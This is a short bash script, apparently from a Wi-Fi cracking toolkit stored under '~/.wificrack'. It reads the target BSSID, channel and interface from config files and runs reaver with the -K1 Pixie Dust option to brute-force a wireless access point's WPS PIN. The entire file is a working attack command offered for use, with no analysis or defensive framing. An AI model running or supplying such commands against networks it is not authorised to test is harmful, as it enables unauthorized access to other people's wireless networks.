#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"

source "$CONFIG_INTERFACE"
source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"


#reaver -b "$BSSID" -c "$CHANNEL" -i "$INTERFACE"
reaver -b "$BSSID" -c "$CHANNEL" -i "$INTERFACE" -vv -K1
